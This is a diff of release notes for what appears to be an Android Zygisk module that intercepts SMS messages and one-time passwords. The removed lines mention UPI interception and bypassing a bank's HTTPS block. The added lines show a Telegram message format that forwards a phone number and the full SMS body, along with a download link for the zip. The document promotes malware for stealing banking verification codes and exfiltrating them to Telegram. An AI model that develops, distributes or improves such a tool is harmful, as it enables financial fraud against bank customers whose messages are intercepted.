@@ -1,7 +1,12 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.66.zip**
+Latest: **virtus-zygisk-mode-v1.0.67.zip**
 
-Fix: Hero/Axis verify To+body ab TG pe — A16 empty-iface parse, UPI intercept, Java writes code_cache + service queue (bank HTTPS block bypass).
+TG format + One-tap copy:
+```
+📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥
+To +919920104300
+Message: <full SMS body>
+```
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.66.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.67.zip
